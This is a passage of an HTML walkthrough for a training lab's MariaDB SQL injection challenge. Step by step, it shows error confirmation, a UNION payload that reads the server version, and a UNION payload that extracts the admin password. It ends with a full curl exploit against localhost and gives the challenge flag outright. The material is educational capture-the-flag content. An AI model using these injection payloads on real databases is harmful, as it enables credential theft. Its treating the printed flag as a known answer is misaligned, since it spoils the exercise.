<h4>Step 1: Test Normal Lookup</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>1<br>
        <span class="prompt">SQL: </span>SELECT username, password, email FROM users WHERE id = '1' AND username != 'admin'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Username:</strong> alice &nbsp;&bull;&nbsp; <strong>Password:</strong> alice_maria_42 &nbsp;&bull;&nbsp; <strong>Email:</strong> alice@example.com
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>MariaDB Error:</strong> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'admin'' at line 1
    </div>
</div>

<h4>Step 3: Confirm MariaDB via @@version</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Version Check</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' UNION SELECT @@version, NULL, NULL -- <br><br>
        <span class="prompt">Output:</span><br>
        <strong>Username:</strong> <strong>11.8.6-MariaDB-2 from Debian</strong> &nbsp;&bull;&nbsp; <strong>Password:</strong>  &nbsp;&bull;&nbsp; <strong>Email:</strong><br>
        <span class="prompt">// Confirmed MariaDB (not MySQL)</span>
    </div>
</div>

<h4>Step 4: Extract Admin Password</h4>
<p>
    The query filters <code>WHERE username != 'admin'</code>, but UNION bypasses this --
    the filter only applies to the first SELECT, not the UNION.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. UNION Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' UNION SELECT username, password, email FROM users WHERE username='admin' -- <br><br>
        <span class="prompt">Output:</span><br>
        <strong>Username:</strong> admin &nbsp;&bull;&nbsp; <strong>Password:</strong> <strong>FLAG{ma_un10n_mysql_c0mp4t}</strong> &nbsp;&bull;&nbsp; <strong>Email:</strong> admin@sqli-arena.local
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy the admin password and paste it into the verification form:
    <code>FLAG{ma_un10n_mysql_c0mp4t}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mariadb/lab1" \<br> --data-urlencode "id=' UNION SELECT username, password, email FROM users WHERE username='admin' -- "<br><br>
        <span class="prompt">Result: </span><strong>Username:</strong> admin &nbsp;&bull;&nbsp; <strong>Password:</strong> FLAG{ma_un10n_mysql_c0mp4t} &nbsp;&bull;&nbsp; <strong>Email:</strong> admin@sqli-arena.local
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> MariaDB is wire-compatible with MySQL. Standard UNION injection
    techniques work identically. Always check <code>@@version</code> to identify whether you are
    targeting MySQL or MariaDB: the version string contains "MariaDB". This distinction matters
    for advanced features like CONNECT engine, Spider engine, and Oracle mode.
</div>
